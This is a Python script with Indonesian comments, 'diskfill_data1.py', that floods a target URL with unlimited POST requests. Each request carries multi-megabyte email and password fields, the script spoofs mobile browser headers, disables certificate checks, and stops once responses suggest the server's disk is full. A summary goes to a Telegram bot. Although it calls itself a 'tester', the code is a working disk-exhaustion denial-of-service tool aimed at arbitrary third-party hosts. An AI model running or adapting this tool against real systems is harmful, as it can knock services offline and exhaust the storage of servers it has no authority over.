#!/usr/bin/env python3
"""
diskfill_data1.py - Large POST payload sender
Mengirim payload teks besar pada field email & password.

Usage:
    python3 diskfill_data1.py <url> [cookie] [size_mb] [count]

Contoh:
    python3 diskfill_data1.py https://target.com/data1.php "PHPSESSID=abc123"
    python3 diskfill_data1.py https://target.com/data1.php "PHPSESSID=abc123" 16
    python3 diskfill_data1.py https://target.com/data1.php "PHPSESSID=abc123" 8 50
    python3 diskfill_data1.py https://target.com/data1.php "" 8 50
"""

import argparse
import itertools
import os
import sys
import time
from typing import Optional

import urllib3
import requests
from dotenv import load_dotenv
from requests.exceptions import RequestException

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Default headers
DEFAULT_HEADERS = {
    "Accept": "*/*",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "User-Agent": (
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36"
    ),
    "X-Requested-With": "XMLHttpRequest",
    "sec-ch-ua": '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

DELAY = 0.15
TIMEOUT = 90

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")


def send_telegram_notification(message: str, token: str, chat_ids_str: str):
    chat_ids = [cid.strip() for cid in chat_ids_str.split(",") if cid.strip()]
    for chat_id in chat_ids:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML",
        }
        try:
            response = requests.post(url, data=payload, timeout=10)
            if response.ok:
                print(
                    f"  [TELEGRAM] Notifikasi terkirim ke Chat ID: {chat_id}")
            else:
                print(
                    f"  [TELEGRAM] Gagal mengirim ke {chat_id}: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"  [TELEGRAM] Error ke {chat_id}: {e}")


def parse_cookie(raw: str) -> dict:
    """Parse string cookie jadi dictionary. Contoh: 'PHPSESSID=abc123; key=val'"""
    result = {}
    for part in raw.split(";"):
        part = part.strip()
        if "=" in part:
            key, val = part.split("=", 1)
            result[key.strip()] = val.strip()
    return result


def build_text(size_mb: int) -> str:
    return "A" * (size_mb * 1024 * 1024)


def looks_full(resp: requests.Response) -> bool:
    if resp.status_code in (500, 503, 507):
        return True
    body = (resp.text or "").lower()
    needles = (
        "no space", "disk full", "enospc", "quota",
        "insufficient storage", "write failed", "allowed memory size",
    )
    return any(n in body for n in needles)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Disk Fill POST Tester - Kirim payload besar terus-menerus",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Contoh:
  python3 %(prog)s https://target.com/data1.php "PHPSESSID=abc123"
  python3 %(prog)s https://target.com/data1.php "PHPSESSID=abc123" 16
  python3 %(prog)s https://target.com/data1.php "PHPSESSID=abc123" 8 50
  python3 %(prog)s https://target.com/data1.php "PHPSESSID=abc123;token=xyz" 4 0
  python3 %(prog)s https://target.com/data1.php "" 4 10
        """,
    )

    parser.add_argument("url", type=str, help="URL target")
    parser.add_argument("cookie", type=str, nargs="?", default="",
                        help="Session cookie (opsional, bisa dikosongkan)")
    parser.add_argument("size_mb", type=int, nargs="?", default=8,
                        help="Ukuran field per MB (default: 8 MB)")
    parser.add_argument("count", type=int, nargs="?", default=0,
                        help="Jumlah request, 0 = unlimited (default: 0)")

    args = parser.parse_args()

    if args.size_mb < 1:
        print("size_mb minimal 1 MB", file=sys.stderr)
        sys.exit(1)

    return args


def main() -> None:
    args = parse_args()

    url = args.url
    size_mb = args.size_mb
    count = args.count

    blob = build_text(size_mb)

    session = requests.Session()
    session.verify = False
    session.headers.update(DEFAULT_HEADERS)

    # Cookie opsional — jika diisi, parse dan gunakan
    if args.cookie:
        cookies = parse_cookie(args.cookie)
        session.cookies.update(cookies)
    else:
        cookies = {}

    # Set Origin & Referer dari URL
    from urllib.parse import urlparse
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    session.headers["Origin"] = origin
    session.headers["Referer"] = origin + "/"

    # Info
    print("=" * 60)
    print("  Disk Fill POST Tester")
    print("=" * 60)
    print(f"  URL        : {url}")
    print(
        f"  Cookie     : {dict(cookies) if cookies else '(kosong / session)'}")
    print(f"  Size/field : {size_mb} MB (x2 = ~{size_mb * 2} MB per POST)")
    print(f"  Count      : {'Unlimited' if count == 0 else count}")
    print(f"  Delay      : {DELAY}s")
    print(f"  Timeout    : {TIMEOUT}s")
    print("=" * 60)
    print()

    sent = 0
    success = 0
    failed = 0
    total_bytes = 0
    start = time.time()
    full_detected = False

    for i in itertools.count(1):
        if count and i > count:
            break

        data = {
            "email": f"flood{i}@" + blob[:size_mb * 1024 * 1024 - 20],
            "password": blob,
            "login": "Google Play",
        }

        try:
            resp = session.post(url, data=data, timeout=TIMEOUT)
            sent += 1
            total_bytes += len(blob) * 2
            elapsed = max(time.time() - start, 0.001)
            rate = (total_bytes / (1024 * 1024)) / elapsed

            # Status
            if resp.status_code == 200:
                status = "OK"
                success += 1
            elif resp.status_code >= 500:
                status = "ERR"
                failed += 1
            else:
                status = "???"
                failed += 1

            print(
                f"  [{sent:>6}] {status} HTTP {resp.status_code} "
                f"| {rate:>6.2f} MB/s | ~{total_bytes / (1024*1024):>8.2f} MB total"
            )

            if looks_full(resp):
                print()
                print("  DISK KEMUNGKINAN PENUH / SERVER ERROR!")
                print(f"  Response: {resp.status_code} - {resp.text[:200]}")
                print()
                full_detected = True
                break

            if DELAY:
                time.sleep(DELAY)

        except RequestException as e:
            print(f"  [{sent:>6}] ERROR: {e}")
            failed += 1
            sent += 1
            time.sleep(1)

    # Ringkasan
    elapsed = time.time() - start
    success_rate = (success / sent * 100) if sent > 0 else 0
    print()
    print("=" * 60)
    print("  RINGKASAN")
    print("=" * 60)
    print(f"  Request          : {sent}")
    print(f"  ✅ Berhasil      : {success}")
    print(f"  ❌ Gagal         : {failed}")
    print(f"  📈 Tingkat Sukses: {success_rate:.2f}%")
    print(f"  Total data       : {total_bytes / (1024*1024):.2f} MB")
    print(f"  Waktu            : {elapsed:.2f} detik")
    if elapsed > 0:
        print(
            f"  Rata-rata        : {total_bytes / (1024*1024) / elapsed:.2f} MB/s")
        print(f"  Req/s            : {sent / elapsed:.2f}")
    print(
        f"  Status           : {'DISK PENUH / ERROR' if full_detected else 'Selesai normal'}")
    print("=" * 60)

    # Kirim notifikasi Telegram
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        status_label = "🛑 DISK PENUH / ERROR" if full_detected else "✅ Selesai Normal"
        size_per_field = f"{size_mb} MB (x2 = ~{size_mb * 2} MB/POST)"
        summary_message = (
            f"<b>💾 LAPORAN DISK FILL POST TESTER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🟢 <b>Berhasil:</b> {success}\n"
            f"🔴 <b>Gagal:</b> {failed}\n"
            f"📥 <b>Total Request:</b> {sent}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 <b>Ukuran per Field:</b> {size_per_field}\n"
            f"💿 <b>Total Data Terkirim:</b> {total_bytes / (1024*1024):.2f} MB\n"
            f"⏱️ <b>Waktu Eksekusi:</b> {elapsed:.2f} detik\n"
            f"⚡ <b>Rata-rata:</b> {total_bytes / (1024*1024) / elapsed:.2f} MB/s\n"
            f"📈 <b>Tingkat Keberhasilan:</b> {success_rate:.2f}%\n"
            f"🎯 <b>Target:</b> {url}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{status_label}"
        )
        send_telegram_notification(
            summary_message, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)


if __name__ == "__main__":
    main()
